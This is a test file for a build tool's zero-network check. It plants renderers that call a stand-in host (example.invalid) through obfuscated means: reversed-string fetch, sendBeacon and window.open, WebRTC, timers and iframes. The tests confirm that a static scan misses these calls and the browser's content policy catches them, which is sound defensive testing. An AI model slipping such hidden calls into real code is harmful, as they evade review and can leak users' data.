/**
 * Zero network, checked in `comparanda build` itself (#115, ADR-0013): a
 * `fetch()` planted inside a cell renderer fails the build, not just CI.
 *
 * The planted renderer is the bug ADR-0013 names: it fires only when its
 * encoding is drawn, so a load-and-assert check passes it. It is written so the
 * static pre-filter cannot see it, which leaves the browser check to catch it.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { chromium, type Browser } from 'playwright';

import { buildStandalone, type BuildResult } from '../../src/build/index.js';
import { CSP_META, NetworkReached } from '../../src/build/network.js';

const repo = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const relocationJson = JSON.parse(await readFile(join(repo, 'examples', 'relocation.json'), 'utf8'));
const src = (path: string) => JSON.stringify(pathToFileURL(join(repo, 'src', path)).href);

let dir: string;
let built: BuildResult;
beforeAll(async () => {
  dir = await mkdtemp(join(tmpdir(), 'comparanda-network-test-'));
  built = await buildStandalone(relocationJson);
});
afterAll(async () => {
  await rm(dir, { recursive: true, force: true });
});

/**
 * Built with `budget: false`: this entry registers every shipped encoding, more
 * than the shipped page does, and what it tests is the network check, which a
 * byte overrun would otherwise pre-empt. The shipped page's bytes are
 * budget.test.ts's to enforce.
 *
 * A standalone entry like the shipped one, whose `value` encoding calls
 * `reach` from inside its cell renderer. Everything else is the shipped view.
 */
async function plantedEntry(name: string, reach: string): Promise<string> {
  const entry = join(dir, `${name}.ts`);
  await writeFile(entry, `
import { Analysis } from ${src('core/schema/analysis.ts')};
import { mountMatrix } from ${src('view/mount.ts')};
import { createEncodingRegistry, defineEncoding } from ${src('view/encodings/registry.ts')};
import { SHIPPED_ENCODINGS } from ${src('view/encodings/shipped.ts')};
const planted = defineEncoding({
  id: 'value', label: 'Value', texture: { channel: 'none', because: 'planted' },
  prepare: () => ({
    mark: (alt) => { ${reach}; return {}; },
    legend: { title: 'planted', entries: [], notes: [] },
  }),
});
const encodings = createEncodingRegistry([...SHIPPED_ENCODINGS.filter((e) => e.id !== 'value'), planted]);
const read = (id) => document.getElementById(id).textContent;
const settings = JSON.parse(read('comparanda-settings'));
mountMatrix(document.getElementById('comparanda-root'), {
  analysis: Analysis.parse(JSON.parse(read('comparanda-analysis'))), measure: settings.measure,
  ...(settings.encoding ? { encoding: settings.encoding } : {}),
}, { encodings });
`);
  return entry;
}

describe('the page carries the policy', () => {
  it('in <head>, before every script, once', () => {
    const at = built.html.indexOf(CSP_META);
    expect(at).toBeGreaterThan(0);
    expect(at).toBeLessThan(built.html.search(/<script\b/));
    expect(built.html.indexOf(CSP_META, at + 1)).toBe(-1);
    expect(at).toBeLessThan(built.html.indexOf('</head>'));
  });

  it('and was exercised in Chromium under every encoding the page registers, which the shipped page reads from its matrix', () => {
    expect(built.checked).toEqual({ by: 'browser', encodings: ['text-only'], couldNotDraw: [] });
  });

  it('an encoding the page does not register is a failure, not a pass that ran nothing', async () => {
    const failure = await buildStandalone(relocationJson, { checkEncodings: ['value'] }).catch((e: unknown) => e);
    expect(failure).toBeInstanceOf(NetworkReached);
    expect((failure as NetworkReached).findings.join('\n')).toMatch(/encoding "value": the page does not register it/);
  });

  it('which the browser enforces: a fetch from the opened file is refused, not merely absent', async () => {
    const browser: Browser = await chromium.launch();
    try {
      const file = join(dir, 'enforced.html');
      await writeFile(file, built.html);
      const page = await browser.newPage();
      const requests: string[] = [];
      const refused: string[] = [];
      // Completed requests only: Chromium raises an XHR's request event and then fails it with "csp", unsent.
      page.on('requestfinished', (r) => requests.push(r.url()));
      const blocked: string[] = [];
      page.on('requestfailed', (r) => { if (r.failure()?.errorText === 'csp') blocked.push(r.url()); });
      page.on('console', (m) => { if (m.type() === 'error' && /Content Security Policy/i.test(m.text())) refused.push(m.text()); });
      await page.goto(pathToFileURL(file).href);
      await page.waitForSelector('table[role="grid"]');
      const outcome = await page.evaluate(async () => {
        const tries: Record<string, string> = {};
        try { await fetch('https://example.invalid/'); tries['fetch'] = 'sent'; } catch (e) { tries['fetch'] = String(e); }
        try { const x = new XMLHttpRequest(); x.open('GET', 'https://example.invalid/'); x.send(); tries['xhr'] = 'sent'; } catch (e) { tries['xhr'] = String(e); }
        tries['beacon'] = String(navigator.sendBeacon('https://example.invalid/', 'x'));
        return tries;
      });
      expect(outcome['fetch']).toMatch(/TypeError/);
      // sendBeacon reports it queued the data; the policy refuses it all the same, and says so.
      expect(refused.length).toBeGreaterThanOrEqual(3);
      expect(requests.filter((u) => u.startsWith('http'))).toEqual([]);
      expect(blocked).toEqual(['https://example.invalid/']);
    } finally {
      await browser.close();
    }
  });
});

describe('a planted network call fails the build', () => {
  it('a fetch() hidden from the scan, inside a cell renderer, fails it in the browser, under that encoding only', async () => {
    const entry = await plantedEntry('hidden-fetch', "globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/' + alt).catch(() => {})");
    const failure = await buildStandalone(relocationJson, { entry, budget: false }).catch((e: unknown) => e);
    expect(failure).toBeInstanceOf(NetworkReached);
    const { message, findings } = failure as NetworkReached;
    expect(message).toMatch(/exercised in Chromium/);
    // Only when that renderer ran: a page merely loaded would have passed.
    expect(findings.every((f) => f.startsWith('encoding "value"'))).toBe(true);
    expect(findings.some((f) => /Content Security Policy|example\.invalid/i.test(f))).toBe(true);
  });

  it('a plain fetch() fails it before any browser starts, naming the string', async () => {
    const entry = await plantedEntry('plain-fetch', "fetch('https://example.invalid/' + alt)");
    const failure = await buildStandalone(relocationJson, { entry, check: 'static', budget: false }).catch((e: unknown) => e);
    expect(failure).toBeInstanceOf(NetworkReached);
    expect((failure as NetworkReached).message).toMatch(/a fetch\(\) call: .*fetch\(/);
  });

  // Each hidden from the scan: the browser check is what must catch them.
  for (const [what, reach] of [
    ['a fetch put off with a timer', "setTimeout(() => globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/' + alt).catch(() => {}), 2500)"],
    ['a fetch in a click handler', "document.addEventListener('click', () => globalThis[[...'hctef'].reverse().join('')]('https://example.invalid/').catch(() => {}), { once: true })"],
    ['a new window, which no CSP governs', "window[[...'nepo'].reverse().join('')]('https://example.invalid/' + alt)"],
    ['a WebRTC connection, which no CSP governs', "try { new window[[...'noitcennoCreePCTR'].reverse().join('')]({ iceServers: [{ urls: 'stun:127.0.0.1:9' }] }); } catch {}"],
    ['a WebRTC connection made through an iframe', "try { const f = document.body.appendChild(document.createElement('iframe')); new f.contentWindow[[...'noitcennoCreePCTR'].reverse().join('')]({ iceServers: [] }); } catch {}"],
    ['a new window opened through an iframe', "try { const f = document.body.appendChild(document.createElement('iframe')); f.contentWindow[[...'nepo'].reverse().join('')]('https://example.invalid/'); } catch {}"],
  ] as const) {
    it(`${what} fails it`, async () => {
      const failure = await buildStandalone(relocationJson, { entry: await plantedEntry(what.replace(/\W+/g, '-'), reach), budget: false }).catch((e: unknown) => e);
      expect(failure, what).toBeInstanceOf(NetworkReached);
      const { findings } = failure as NetworkReached;
      expect(findings.some((f) => f.startsWith('encoding "value"')), what).toBe(true);
      // Nothing else: the page as built, which never draws the planted renderer, passed.
      expect(findings.filter((f) => !f.startsWith('encoding "value"')), what).toEqual([]);
    });
  }

  it('a sendBeacon hidden from the scan fails it too: the violation surfaces as a console error', async () => {
    const entry = await plantedEntry('beacon', "navigator[[...'nocaeBdnes'].reverse().join('')]('https://example.invalid/', alt)");
    const failure = await buildStandalone(relocationJson, { entry, budget: false }).catch((e: unknown) => e);
    expect(failure).toBeInstanceOf(NetworkReached);
    expect((failure as NetworkReached).findings.some((f) => f.startsWith('encoding "value"'))).toBe(true);
  });

  it('what the analysis says is never scanned: a justification may quote fetch()', async () => {
    const quoting = structuredClone(relocationJson);
    quoting.subject.question = 'Does fetch("https://example.invalid/") appear here?';
    const { checked } = await buildStandalone(quoting, { check: 'static' });
    expect(checked).toEqual({ by: 'static', encodings: [], couldNotDraw: [] });
  });
});
